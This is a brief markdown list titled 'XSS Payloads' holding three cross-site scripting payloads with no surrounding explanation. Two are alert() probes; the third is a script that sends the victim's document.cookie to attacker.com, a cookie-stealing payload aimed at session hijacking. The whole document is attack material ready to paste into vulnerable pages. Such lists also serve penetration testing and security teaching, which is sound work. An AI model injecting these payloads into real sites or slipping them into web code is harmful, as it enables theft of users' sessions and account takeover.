# XSS Payloads

## Payload 1
<script>alert('XSS')</script>

## Payload 2
<img src=x onerror=alert('XSS')>

## Payload 3
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>